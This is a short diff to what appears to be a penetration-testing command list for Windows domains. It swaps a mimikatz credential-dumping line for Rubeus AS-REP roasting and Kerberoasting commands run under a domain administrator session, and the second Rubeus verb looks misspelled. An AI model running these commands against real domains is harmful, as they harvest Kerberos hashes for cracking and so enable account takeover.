@@ -1,2 +1,4 @@
 runas /netonly /user:mydomain\administrator powershell
-C:\tools\mimikatz\x64\mimikatz.exe
+C:\tools\rubeus\Rubeus\bin\Release\Rubeus.exe asreproast
+C:\tools\rubeus\Rubeus\bin\Release\Rubeus.exe kerberoasting
+
